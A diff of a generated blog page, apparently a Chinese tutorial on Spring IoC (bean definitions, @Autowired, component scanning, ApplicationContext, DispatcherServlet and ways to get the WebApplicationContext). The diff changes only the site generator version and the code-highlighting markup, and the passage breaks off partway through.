@@ -3,7 +3,7 @@
     <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
     <meta charset="UTF-8" />
 
-    <meta name="generator" content="Hugo 0.92.0" /><meta name="theme-color" content="#16171d" />
+    <meta name="generator" content="Hugo 0.94.2" /><meta name="theme-color" content="#16171d" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     
     <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
@@ -18,7 +18,7 @@
 
     
     
-        <script src="/js/meme.min.883a355335df5c9f19d469cd25bb68215497fd354fb3a8699eaf851799c161a8.js"></script>
+        <script src="/js/meme.min.aa6eafedce46ed74b4ce8a5ccd665b53678dd707d3ba5339679e4b4dda556062.js"></script>
 
     
 
@@ -304,22 +304,22 @@
 </span><span class="lnt">15
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="nt">&lt;beans&gt;</span>
-    <span class="nt">&lt;bean</span> <span class="na">id=</span><span class="s">&#34;dataSource&#34;</span> <span class="na">class=</span><span class="s">&#34;HikariDataSource&#34;</span> <span class="nt">/&gt;</span>
-    <span class="nt">&lt;bean</span> <span class="na">id=</span><span class="s">&#34;bookService&#34;</span> <span class="na">class=</span><span class="s">&#34;BookService&#34;</span><span class="nt">&gt;</span>
-        <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">&#34;dataSource&#34;</span> <span class="na">ref=</span><span class="s">&#34;dataSource&#34;</span> <span class="nt">/&gt;</span>
-    <span class="nt">&lt;/bean&gt;</span>
-    <span class="nt">&lt;bean</span> <span class="na">id=</span><span class="s">&#34;userService&#34;</span> <span class="na">class=</span><span class="s">&#34;UserService&#34;</span><span class="nt">&gt;</span>
-        <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">&#34;dataSource&#34;</span> <span class="na">ref=</span><span class="s">&#34;dataSource&#34;</span> <span class="nt">/&gt;</span>
-    <span class="nt">&lt;/bean&gt;</span>
-<span class="nt">&lt;/beans&gt;</span>
-<span class="c">&lt;!--
-</span><span class="c">bean标签 默认情况下它调用的是类中的无参构造函数。如果没有无参构造函数则不能创建成功。
-</span><span class="c">属性id：给对象在容器中提供一个唯一标识。用于获取对象。
-</span><span class="c">class： 指定类的全限定类名。用于反射创建对象。默认情况下调用无参构造函数。
-</span><span class="c">property标签：通过Set注入（比如这里就是通过调用SetdataSource() 方法来给BookService和UserService对象的dataSource字段赋值）
-</span><span class="c">--&gt;</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;beans&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;bean</span> <span class="na">id=</span><span class="s">&#34;dataSource&#34;</span> <span class="na">class=</span><span class="s">&#34;HikariDataSource&#34;</span> <span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;bean</span> <span class="na">id=</span><span class="s">&#34;bookService&#34;</span> <span class="na">class=</span><span class="s">&#34;BookService&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">&#34;dataSource&#34;</span> <span class="na">ref=</span><span class="s">&#34;dataSource&#34;</span> <span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/bean&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;bean</span> <span class="na">id=</span><span class="s">&#34;userService&#34;</span> <span class="na">class=</span><span class="s">&#34;UserService&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">&#34;dataSource&#34;</span> <span class="na">ref=</span><span class="s">&#34;dataSource&#34;</span> <span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/bean&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/beans&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="c">&lt;!--
+</span></span></span><span class="line"><span class="cl"><span class="c">bean标签 默认情况下它调用的是类中的无参构造函数。如果没有无参构造函数则不能创建成功。
+</span></span></span><span class="line"><span class="cl"><span class="c">属性id：给对象在容器中提供一个唯一标识。用于获取对象。
+</span></span></span><span class="line"><span class="cl"><span class="c">class： 指定类的全限定类名。用于反射创建对象。默认情况下调用无参构造函数。
+</span></span></span><span class="line"><span class="cl"><span class="c">property标签：通过Set注入（比如这里就是通过调用SetdataSource() 方法来给BookService和UserService对象的dataSource字段赋值）
+</span></span></span><span class="line"><span class="cl"><span class="c">--&gt;</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>上述XML配置文件指示IoC容器创建3个JavaBean组件（类），并把id为dataSource的组件通过属性dataSource（即调用setDataSource()方法）注入到另外两个组件中。</p>
 <div class="highlight"><div class="chroma">
@@ -332,13 +332,13 @@
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="c1">//例如：获取BookService的实例对象
-</span><span class="c1">//创建一个Spring的IoC容器实例，然后加载配置文件。让Spring容器创建并装配好配置文件中指定的所有Bean。
-</span><span class="c1"></span><span class="n">ApplicationContext</span> <span class="n">cl</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ClassPathXmlApplicationContext</span><span class="o">(</span><span class="s">&#34;bean.xml&#34;</span><span class="o">);</span>
-<span class="c1">//获取BookService对象（对象由IOC容器实例化）
-</span><span class="c1"></span><span class="n">bookService</span> <span class="n">bs</span> <span class="o">=</span> <span class="o">(</span><span class="n">bookService</span><span class="o">)</span><span class="n">cl</span><span class="o">.</span><span class="na">getBean</span><span class="o">(</span><span class="s">&#34;bookService&#34;</span><span class="o">);</span>  
-<span class="n">bs</span><span class="o">.</span><span class="na">select</span><span class="o">();</span><span class="c1">//调用对象方法
-</span></code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//例如：获取BookService的实例对象
+</span></span></span><span class="line"><span class="cl"><span class="c1">//创建一个Spring的IoC容器实例，然后加载配置文件。让Spring容器创建并装配好配置文件中指定的所有Bean。
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">ApplicationContext</span> <span class="n">cl</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ClassPathXmlApplicationContext</span><span class="o">(</span><span class="s">&#34;bean.xml&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//获取BookService对象（对象由IOC容器实例化）
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">bookService</span> <span class="n">bs</span> <span class="o">=</span> <span class="o">(</span><span class="n">bookService</span><span class="o">)</span><span class="n">cl</span><span class="o">.</span><span class="na">getBean</span><span class="o">(</span><span class="s">&#34;bookService&#34;</span><span class="o">);</span>  
+</span></span><span class="line"><span class="cl"><span class="n">bs</span><span class="o">.</span><span class="na">select</span><span class="o">();</span><span class="c1">//调用对象方法
+</span></span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>这里的bean是由Spring IoC容器负责实例化、配置、组装和管理的对象。</p>
 <h3 id="注解自动装载bean"><a href="#注解自动装载bean" class="anchor-link">#</a><a href="#contents:注解自动装载bean" class="headings">注解自动装载bean</a></h3>
@@ -362,22 +362,22 @@
 </span><span class="lnt">15
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="o">&lt;?</span><span class="n">xml</span> <span class="n">version</span><span class="o">=</span><span class="s">&#34;1.0&#34;</span> <span class="n">encoding</span><span class="o">=</span><span class="s">&#34;UTF-8&#34;</span><span class="o">?&gt;</span>
-<span class="o">&lt;</span><span class="n">beans</span> <span class="n">xmlns</span><span class="o">=</span><span class="s">&#34;&lt;http://www.springframework.org/schema/beans&gt;&#34;</span>
-       <span class="n">xmlns</span><span class="o">:</span><span class="n">xsi</span><span class="o">=</span><span class="s">&#34;&lt;http://www.w3.org/2001/XMLSchema-instance&gt;&#34;</span>
-       <span class="n">xmlns</span><span class="o">:</span><span class="n">context</span><span class="o">=</span><span class="s">&#34;&lt;http://www.springframework.org/schema/context&gt;&#34;</span>
-       <span class="n">xsi</span><span class="o">:</span><span class="n">schemaLocation</span><span class="o">=</span><span class="s">&#34;&lt;http://www.springframework.org/schema/beans&gt;
-</span><span class="s">       &lt;http://www.springframework.org/schema/beans/spring-beans.xsd&gt;
-</span><span class="s">       &lt;http://www.springframework.org/schema/context&gt;
-</span><span class="s">       &lt;https://www.springframework.org/schema/context/spring-context.xsd&gt;&#34;</span><span class="o">&gt;</span>
-    <span class="o">&lt;</span><span class="n">context</span><span class="o">:</span><span class="n">annotation</span><span class="o">-</span><span class="n">config</span><span class="o">/&gt;</span>
-    <span class="o">&lt;</span><span class="n">bean</span> <span class="n">id</span><span class="o">=</span><span class="s">&#34;cat&#34;</span> <span class="n">class</span><span class="o">=</span><span class="s">&#34;com.test.doamin.Cat&#34;</span><span class="o">/&gt;</span>
-    <span class="o">&lt;</span><span class="n">bean</span> <span class="n">id</span><span class="o">=</span><span class="s">&#34;dog&#34;</span> <span class="n">class</span><span class="o">=</span><span class="s">&#34;com.test.doamin.Dong&#34;</span><span class="o">/&gt;</span>
-    <span class="o">&lt;</span><span class="n">bean</span> <span class="n">id</span><span class="o">=</span><span class="s">&#34;person&#34;</span> <span class="n">class</span><span class="o">=</span><span class="s">&#34;com.test.doamin.Perpon&#34;</span><span class="o">&gt;</span>
-        <span class="o">&lt;</span><span class="n">property</span> <span class="n">name</span><span class="o">=</span><span class="s">&#34;name&#34;</span> <span class="n">value</span><span class="o">=</span><span class="s">&#34;xiaoming&#34;</span><span class="o">/&gt;</span>
-    <span class="o">&lt;/</span><span class="n">bean</span><span class="o">&gt;</span>
-<span class="o">&lt;/</span><span class="n">beans</span><span class="o">&gt;</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="n">xml</span> <span class="n">version</span><span class="o">=</span><span class="s">&#34;1.0&#34;</span> <span class="n">encoding</span><span class="o">=</span><span class="s">&#34;UTF-8&#34;</span><span class="o">?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">beans</span> <span class="n">xmlns</span><span class="o">=</span><span class="s">&#34;&lt;http://www.springframework.org/schema/beans&gt;&#34;</span>
+</span></span><span class="line"><span class="cl">       <span class="n">xmlns</span><span class="o">:</span><span class="n">xsi</span><span class="o">=</span><span class="s">&#34;&lt;http://www.w3.org/2001/XMLSchema-instance&gt;&#34;</span>
+</span></span><span class="line"><span class="cl">       <span class="n">xmlns</span><span class="o">:</span><span class="n">context</span><span class="o">=</span><span class="s">&#34;&lt;http://www.springframework.org/schema/context&gt;&#34;</span>
+</span></span><span class="line"><span class="cl">       <span class="n">xsi</span><span class="o">:</span><span class="n">schemaLocation</span><span class="o">=</span><span class="s">&#34;&lt;http://www.springframework.org/schema/beans&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s">       &lt;http://www.springframework.org/schema/beans/spring-beans.xsd&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s">       &lt;http://www.springframework.org/schema/context&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s">       &lt;https://www.springframework.org/schema/context/spring-context.xsd&gt;&#34;</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="n">context</span><span class="o">:</span><span class="n">annotation</span><span class="o">-</span><span class="n">config</span><span class="o">/&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="n">bean</span> <span class="n">id</span><span class="o">=</span><span class="s">&#34;cat&#34;</span> <span class="n">class</span><span class="o">=</span><span class="s">&#34;com.test.doamin.Cat&#34;</span><span class="o">/&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="n">bean</span> <span class="n">id</span><span class="o">=</span><span class="s">&#34;dog&#34;</span> <span class="n">class</span><span class="o">=</span><span class="s">&#34;com.test.doamin.Dong&#34;</span><span class="o">/&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="n">bean</span> <span class="n">id</span><span class="o">=</span><span class="s">&#34;person&#34;</span> <span class="n">class</span><span class="o">=</span><span class="s">&#34;com.test.doamin.Perpon&#34;</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="n">property</span> <span class="n">name</span><span class="o">=</span><span class="s">&#34;name&#34;</span> <span class="n">value</span><span class="o">=</span><span class="s">&#34;xiaoming&#34;</span><span class="o">/&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;/</span><span class="n">bean</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;/</span><span class="n">beans</span><span class="o">&gt;</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
@@ -389,13 +389,13 @@
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="c1">//再到成员变量处加入@Autowired注解声明
-</span><span class="c1"></span><span class="kd">private</span> <span class="n">String</span> <span class="n">name</span><span class="o">;</span>
-<span class="nd">@Autowired</span>
-<span class="kd">private</span> <span class="n">Dong</span> <span class="n">dog</span><span class="o">;</span>
-<span class="nd">@Autowired</span>
-<span class="kd">private</span> <span class="n">Cat</span> <span class="n">cat</span><span class="o">;</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//再到成员变量处加入@Autowired注解声明
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">private</span> <span class="n">String</span> <span class="n">name</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="nd">@Autowired</span>
+</span></span><span class="line"><span class="cl"><span class="kd">private</span> <span class="n">Dong</span> <span class="n">dog</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="nd">@Autowired</span>
+</span></span><span class="line"><span class="cl"><span class="kd">private</span> <span class="n">Cat</span> <span class="n">cat</span><span class="o">;</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p><code>context:annotation-config</code>用于激活那些已经在spring容器里注册过的bean上面的注解。(激活@Resource和@Autowired注解)</p>
 <p><code>&lt;context:component-scan&gt;</code>元素除了完成与<code>&lt;context:annotation-config&gt;</code>一样的工作，还允许Spring自动检测Bean和定义的Bean，这意味着不使用配置<bean>元素。base-package属性标识了会所扫描的包。</p>
@@ -408,12 +408,12 @@
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="c">&lt;!--开启注解扫描--&gt;</span>
-<span class="nt">&lt;context:component-scan</span> <span class="na">base-package=</span><span class="s">&#34;com.example&#34;</span><span class="nt">&gt;</span>
-<span class="c">&lt;!--配置不扫描Controller注解--&gt;</span>
-<span class="nt">&lt;context:exclude-filter</span> <span class="na">type=</span><span class="s">&#34;annotation&#34;</span> <span class="na">expression=</span><span class="s">&#34;org.springframework.stereotype.Controller&#34;</span><span class="nt">/&gt;</span>
-<span class="nt">&lt;/context:component-scan&gt;</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="c">&lt;!--开启注解扫描--&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;context:component-scan</span> <span class="na">base-package=</span><span class="s">&#34;com.example&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="c">&lt;!--配置不扫描Controller注解--&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;context:exclude-filter</span> <span class="na">type=</span><span class="s">&#34;annotation&#34;</span> <span class="na">expression=</span><span class="s">&#34;org.springframework.stereotype.Controller&#34;</span><span class="nt">/&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/context:component-scan&gt;</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>为自动检测标注Bean。默认情况下<code>&lt;context:component-scan&gt;</code>查找使用构造型注解所标注的类，这些特殊的注解如下：</p>
 <div class="highlight"><div class="chroma">
@@ -424,11 +424,11 @@
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml">@Component  通用的构造型注解，标识该类为Spring组件（）
-@Controller  标识将该类定义为Spring MVC controller（控制层）
-@Repository  标识将该类定义为数据仓库（持久层）
-@Service 标识将该类定义为服务（服务层，也就是业务层
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl">@Component  通用的构造型注解，标识该类为Spring组件（）
+</span></span><span class="line"><span class="cl">@Controller  标识将该类定义为Spring MVC controller（控制层）
+</span></span><span class="line"><span class="cl">@Repository  标识将该类定义为数据仓库（持久层）
+</span></span><span class="line"><span class="cl">@Service 标识将该类定义为服务（服务层，也就是业务层
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><h3 id="applicationcontext"><a href="#applicationcontext" class="anchor-link">#</a><a href="#contents:applicationcontext" class="headings">ApplicationContext</a></h3>
 <p>Spring容器就是ApplicationContext，它是一个接口，有很多实现类。获得了ApplicationContext的实例，就获得了IoC容器的引用。从ApplicationContext中可以根据Bean的ID获取Bean。</p>
@@ -439,9 +439,9 @@
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="n">BeanFactory</span> <span class="n">factory</span> <span class="o">=</span> <span class="k">new</span> <span class="n">XmlBeanFactory</span><span class="o">(</span><span class="k">new</span> <span class="n">ClassPathResource</span><span class="o">(</span><span class="s">&#34;application.xml&#34;</span><span class="o">));</span>
-<span class="n">MailService</span> <span class="n">mailService</span> <span class="o">=</span> <span class="n">factory</span><span class="o">.</span><span class="na">getBean</span><span class="o">(</span><span class="n">MailService</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">BeanFactory</span> <span class="n">factory</span> <span class="o">=</span> <span class="k">new</span> <span class="n">XmlBeanFactory</span><span class="o">(</span><span class="k">new</span> <span class="n">ClassPathResource</span><span class="o">(</span><span class="s">&#34;application.xml&#34;</span><span class="o">));</span>
+</span></span><span class="line"><span class="cl"><span class="n">MailService</span> <span class="n">mailService</span> <span class="o">=</span> <span class="n">factory</span><span class="o">.</span><span class="na">getBean</span><span class="o">(</span><span class="n">MailService</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>BeanFactory和ApplicationContext的区别在于: BeanFactory的实现是按需创建，即第一次获取Bean时才创建这个Bean，而ApplicationContext会一次性创建所有的Bean。实际上ApplicationContext接口是从BeanFactory接口继承而来的。BeanFactory 接口是Spring IoC容器的实际代表者。</p>
 <h3 id="contextloaderlistener与dispatcherservlet"><a href="#contextloaderlistener与dispatcherservlet" class="anchor-link">#</a><a href="#contents:contextloaderlistener与dispatcherservlet" class="headings">ContextLoaderListener与DispatcherServlet</a></h3>
@@ -479,36 +479,36 @@
 </span><span class="lnt">29
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="nt">&lt;web-app</span> <span class="na">xmlns:xsi=</span><span class="s">&#34;&lt;http://www.w3.org/2001/XMLSchema-instance&gt;&#34;</span>
-         <span class="na">xmlns=</span><span class="s">&#34;&lt;http://java.sun.com/xml/ns/javaee&gt;&#34;</span>
-         <span class="na">xsi:schemaLocation=</span><span class="s">&#34;&lt;http://java.sun.com/xml/ns/javaee&gt; &lt;http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd&gt;&#34;</span>
-         <span class="na">version=</span><span class="s">&#34;2.5&#34;</span><span class="nt">&gt;</span>
-
-    <span class="nt">&lt;display-name&gt;</span>HelloSpringMVC<span class="nt">&lt;/display-name&gt;</span>
-    <span class="nt">&lt;listener&gt;</span>
-        <span class="nt">&lt;listener-class&gt;</span>org.springframework.web.context.ContextLoaderListener<span class="nt">&lt;/listener-class&gt;</span>
-    <span class="nt">&lt;/listener&gt;</span>
-    <span class="nt">&lt;context-param&gt;</span>
-        <span class="nt">&lt;param-name&gt;</span>contextConfigLocation<span class="nt">&lt;/param-name&gt;</span>
-        <span class="nt">&lt;param-value&gt;</span>/WEB-INF/applicationContext.xml<span class="nt">&lt;/param-value&gt;</span>
-    <span class="nt">&lt;/context-param&gt;</span>
-
-    <span class="nt">&lt;servlet&gt;</span>
-        <span class="nt">&lt;servlet-name&gt;</span>dispatcherServlet<span class="nt">&lt;/servlet-name&gt;</span>
-        <span class="nt">&lt;servlet-class&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="nt">&lt;/servlet-class&gt;</span>
-        <span class="nt">&lt;init-param&gt;</span>
-            <span class="nt">&lt;param-name&gt;</span>contextConfigLocation<span class="nt">&lt;/param-name&gt;</span>
-            <span class="nt">&lt;param-value&gt;</span>/WEB-INF/dispatcherServlet-servlet.xml<span class="nt">&lt;/param-value&gt;</span>
-        <span class="nt">&lt;/init-param&gt;</span>
-        <span class="nt">&lt;load-on-startup&gt;</span>1<span class="nt">&lt;/load-on-startup&gt;</span>
-    <span class="nt">&lt;/servlet&gt;</span>
-
-    <span class="nt">&lt;servlet-mapping&gt;</span>
-        <span class="nt">&lt;servlet-name&gt;</span>dispatcherServlet<span class="nt">&lt;/servlet-name&gt;</span>
-        <span class="nt">&lt;url-pattern&gt;</span>/<span class="nt">&lt;/url-pattern&gt;</span>
-    <span class="nt">&lt;/servlet-mapping&gt;</span>
-<span class="nt">&lt;/web-app&gt;</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;web-app</span> <span class="na">xmlns:xsi=</span><span class="s">&#34;&lt;http://www.w3.org/2001/XMLSchema-instance&gt;&#34;</span>
+</span></span><span class="line"><span class="cl">         <span class="na">xmlns=</span><span class="s">&#34;&lt;http://java.sun.com/xml/ns/javaee&gt;&#34;</span>
+</span></span><span class="line"><span class="cl">         <span class="na">xsi:schemaLocation=</span><span class="s">&#34;&lt;http://java.sun.com/xml/ns/javaee&gt; &lt;http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd&gt;&#34;</span>
+</span></span><span class="line"><span class="cl">         <span class="na">version=</span><span class="s">&#34;2.5&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;display-name&gt;</span>HelloSpringMVC<span class="nt">&lt;/display-name&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;listener&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;listener-class&gt;</span>org.springframework.web.context.ContextLoaderListener<span class="nt">&lt;/listener-class&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/listener&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;context-param&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;param-name&gt;</span>contextConfigLocation<span class="nt">&lt;/param-name&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;param-value&gt;</span>/WEB-INF/applicationContext.xml<span class="nt">&lt;/param-value&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/context-param&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;servlet&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;servlet-name&gt;</span>dispatcherServlet<span class="nt">&lt;/servlet-name&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;servlet-class&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="nt">&lt;/servlet-class&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;init-param&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&lt;param-name&gt;</span>contextConfigLocation<span class="nt">&lt;/param-name&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&lt;param-value&gt;</span>/WEB-INF/dispatcherServlet-servlet.xml<span class="nt">&lt;/param-value&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/init-param&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;load-on-startup&gt;</span>1<span class="nt">&lt;/load-on-startup&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/servlet&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;servlet-mapping&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;servlet-name&gt;</span>dispatcherServlet<span class="nt">&lt;/servlet-name&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;url-pattern&gt;</span>/<span class="nt">&lt;/url-pattern&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/servlet-mapping&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/web-app&gt;</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><ul>
 <li>Spring 应用中可以同时有多个 Context，其中只有一个 Root Context，其余都是Child Context。</li>
@@ -535,8 +535,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="n">WebApplicationContext</span> <span class="n">context</span> <span class="o">=</span> <span class="n">WebApplicationContextUtils</span><span class="o">.</span><span class="na">getWebApplicationContext</span><span class="o">(</span><span class="n">RequestContextUtils</span><span class="o">.</span><span class="na">findWebApplicationContext</span><span class="o">(((</span><span class="n">ServletRequestAttributes</span><span class="o">)</span><span class="n">RequestContextHolder</span><span class="o">.</span><span class="na">currentRequestAttributes</span><span class="o">()).</span><span class="na">getRequest</span><span class="o">()).</span><span class="na">getServletContext</span><span class="o">());</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">WebApplicationContext</span> <span class="n">context</span> <span class="o">=</span> <span class="n">WebApplicationContextUtils</span><span class="o">.</span><span class="na">getWebApplicationContext</span><span class="o">(</span><span class="n">RequestContextUtils</span><span class="o">.</span><span class="na">findWebApplicationContext</span><span class="o">(((</span><span class="n">ServletRequestAttributes</span><span class="o">)</span><span class="n">RequestContextHolder</span><span class="o">.</span><span class="na">currentRequestAttributes</span><span class="o">()).</span><span class="na">getRequest</span><span class="o">()).</span><span class="na">getServletContext</span><span class="o">());</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>该方法的原型是: <code>public static WebApplicationContext getWebApplicationContext(ServletContext sc)</code> 所以里面的代码是用来获得ServletContext对象。</p>
 </li>
@@ -548,8 +548,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="n">WebApplicationContext</span> <span class="n">context</span> <span class="o">=</span> <span class="n">RequestContextUtils</span><span class="o">.</span><span class="na">findWebApplicationContext</span><span class="o">(((</span><span class="n">ServletRequestAttributes</span><span class="o">)</span><span class="n">RequestContextHolder</span><span class="o">.</span><span class="na">currentRequestAttributes</span><span class="o">()).</span><span class="na">getRequest</span><span class="o">());</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">WebApplicationContext</span> <span class="n">context</span> <span class="o">=</span> <span class="n">RequestContextUtils</span><span class="o">.</span><span class="na">findWebApplicationContext</span><span class="o">(((</span><span class="n">ServletRequestAttributes</span><span class="o">)</span><span class="n">RequestContextHolder</span><span class="o">.</span><span class="na">currentRequestAttributes</span><span class="o">()).</span><span class="na">getRequest</span><span class="o">());</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>函数原型: <code>public static WebApplicationContext getWebApplicationContext(ServletRequest request)</code> （spring 3.1 中<code>findWebApplicationContext</code>要换成<code>getWebApplicationContext</code> ）</p>
 <p><img src="/images/image-20211106230256.png" alt=""></p>
@@ -566,8 +566,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="n">WebApplicationContext</span> <span class="n">context</span> <span class="o">=</span> <span class="o">(</span><span class="n">WebApplicationContext</span><span class="o">)</span><span class="n">RequestContextHolder</span><span class="o">.</span><span class="na">currentRequestAttributes</span><span class="o">().</span><span class="na">getAttribute</span><span class="o">(</span><span class="s">&#34;org.springframework.web.servlet.DispatcherServlet.CONTEXT&#34;</span><span class="o">,</span> <span class="n">0</span><span class="o">);</span>
-</code></pre></td></tr></table></div>
